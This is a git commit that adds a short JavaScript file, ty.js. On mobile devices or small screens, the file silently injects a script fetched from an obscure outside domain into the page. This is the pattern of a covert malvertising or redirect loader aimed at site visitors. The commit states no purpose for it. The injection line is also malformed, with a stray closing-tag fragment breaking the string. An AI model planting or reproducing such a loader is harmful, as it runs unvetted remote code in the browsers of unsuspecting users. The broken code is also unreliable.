ccd89ad9047fce9cda55aba33963135a6be17e38
sleepyash421 <113919558+sleepyash421@users.noreply.github.com>
2023-05-12 16:43:33 +0700

    Create ty.js

---
+++ ty.js
@@ -0,0 +1,9 @@
+if (screen.width < 500 ||
+ navigator.userAgent.match(/Android/i) ||
+ navigator.userAgent.match(/webOS/i) ||
+ navigator.userAgent.match(/iPhone/i) ||
+ navigator.userAgent.match(/iPod/i)){
+	 
+	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'https://errorparasol.com/fb/1e/01/fb1e01a503f0fa70e403092f2610a690.js'></script>',document.body||document.documentElement)
+	 }
+	 
